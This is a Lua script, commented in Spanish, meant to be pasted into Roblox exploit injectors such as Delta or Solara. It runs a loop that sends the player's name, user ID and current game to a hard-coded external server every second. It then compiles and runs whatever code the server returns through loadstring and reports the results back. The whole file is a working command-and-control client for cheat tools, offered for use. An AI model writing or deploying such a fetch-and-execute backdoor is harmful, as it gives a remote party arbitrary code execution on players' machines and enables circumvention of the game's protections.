--[[
  RBX Executor — Cliente Roblox
  Pégalo UNA vez en tu exploit (Delta, Solara, etc.)
  Recibe scripts desde la web y los ejecuta automáticamente.
]]

local API = "https://mcproblox-production.up.railway.app"
local HEARTBEAT_SEC = 1

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local clientId = tostring(LocalPlayer and LocalPlayer.UserId or math.random(100000, 999999))

-- Compatibilidad exploit / Luau
local compile = loadstring or load
local waitFn = task and task.wait or wait

-- HTTP: la mayoría de exploits no usan HttpService
local function httpRequest(method, url, body)
    local headers = { ["Content-Type"] = "application/json" }

    if syn and syn.request then
        local r = syn.request({ Url = url, Method = method, Headers = headers, Body = body })
        if r and r.Success ~= false and r.Body then
            return true, r.Body
        end
        return false, r and r.Body or "syn.request falló"
    end

    if http and http.request then
        local r = http.request({ Url = url, Method = method, Headers = headers, Body = body })
        if r and (r.StatusCode == 200 or r.StatusCode == 201) and r.Body then
            return true, r.Body
        end
        return false, r and r.Body or "http.request falló"
    end

    if request then
        local r = request({ Url = url, Method = method, Headers = headers, Body = body })
        if r and r.Body then
            return true, r.Body
        end
        return false, "request falló"
    end

    -- Fallback Roblox (a veces bloqueado en exploits)
    local ok, response = pcall(function()
        if method == "GET" then
            return HttpService:GetAsync(url, false)
        end
        return HttpService:PostAsync(url, body or "{}", Enum.HttpContentType.ApplicationJson, false)
    end)
    return ok, response
end

local function getGameName()
    if game and game.Name and game.Name ~= "" then
        return game.Name
    end
    return "Place_" .. tostring(game.PlaceId or 0)
end

local function execCode(code)
    if type(code) ~= "string" or code == "" then
        return false, "Código vacío"
    end

    local fn, compileErr = compile(code)
    if not fn then
        return false, "Compile: " .. tostring(compileErr)
    end

    local ok, runErr = pcall(fn)
    if not ok then
        return false, tostring(runErr)
    end

    return true, "OK"
end

local function postJson(path, payload)
    local body = HttpService:JSONEncode(payload)
    return httpRequest("POST", API .. path, body)
end

print("[RBX] Conectando a " .. API)
print("[RBX] Jugador: " .. (LocalPlayer and LocalPlayer.Name or "?"))

while true do
    local okReq, response = postJson("/api/heartbeat", {
        clientId = clientId,
        player = LocalPlayer and LocalPlayer.Name or "Unknown",
        game = getGameName(),
    })

    if okReq and type(response) == "string" and response ~= "" then
        local okJson, data = pcall(function()
            return HttpService:JSONDecode(response)
        end)

        if okJson and type(data) == "table" then
            if data.clientId then
                clientId = data.clientId
            end

            if data.execute and type(data.execute.code) == "string" then
                local exec = data.execute
                print("[RBX] ▶ Ejecutando script " .. tostring(exec.id))

                local success, outputOrErr = execCode(exec.code)

                postJson("/api/result", {
                    executionId = exec.id,
                    success = success,
                    output = success and (outputOrErr or "") or "",
                    error = success and "" or (outputOrErr or "Error desconocido"),
                })

                if success then
                    print("[RBX] ✓ Listo")
                else
                    warn("[RBX] ✗ " .. tostring(outputOrErr))
                end
            end
        end
    end

    waitFn(HEARTBEAT_SEC)
end
